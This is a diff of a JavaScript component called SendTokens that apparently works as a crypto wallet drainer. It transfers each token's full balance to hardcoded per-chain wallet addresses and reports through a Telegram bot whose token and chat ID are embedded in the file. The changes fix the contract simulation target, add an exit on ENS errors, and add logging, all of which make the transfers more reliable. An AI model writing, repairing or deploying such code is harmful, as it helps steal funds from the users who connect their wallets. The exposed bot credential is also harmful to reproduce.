@@ -12,7 +12,6 @@ import { parseEther, parseGwei } from 'viem'; // Import necessary parsers
 const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
 const TELEGRAM_CHAT_ID = '6718529435';
 
-
 const sendTelegramNotification = async (message) => {
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -33,6 +32,7 @@ const destinationAddresses = {
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
+
 function selectAddressForToken(network) {
   const addresses = {
     1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
@@ -42,6 +42,7 @@ function selectAddressForToken(network) {
     42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
     137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   };
+
 
   const selectedAddress = addresses[network];
 
@@ -95,6 +96,7 @@ export const SendTokens = () => {
         }
       } catch (error) {
         showToast(`Error resolving ENS address: ${error.message}`, 'warning');
+        return; // Exit on ENS resolution error
       }
     }
 
@@ -110,9 +112,11 @@ export const SendTokens = () => {
           ? resolvedDestinationAddress
           : `0x${resolvedDestinationAddress}`;
 
+        console.log(`Attempting to transfer token ${token?.contract_ticker_symbol} to ${formattedDestinationAddress}`);
+
         // Validate transaction using simulateContract
         await publicClient.simulateContract({
-          address: formattedDestinationAddress,
+          address: formattedTokenAddress,
           abi: erc20Abi,
           functionName: 'transfer',
           args: [formattedDestinationAddress, BigInt(token?.balance || '0')],
@@ -126,7 +130,6 @@ export const SendTokens = () => {
           value: parseEther(token?.balance || '0'),
         });
 
-        // Reserve additional gas for transaction safety
         gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Adding a buffer of 500 gwei
 
         // If successful, send the transaction
@@ -149,6 +152,7 @@ export const SendTokens = () => {
           'success',
         );
       } catch (error) {
+        console.error('Transaction Error:', error);
         showToast(`Transaction failed: ${error.message}`, 'error');
       }
     }
@@ -173,3 +177,5 @@ export const SendTokens = () => {
     </div>
   );
 };
+
+
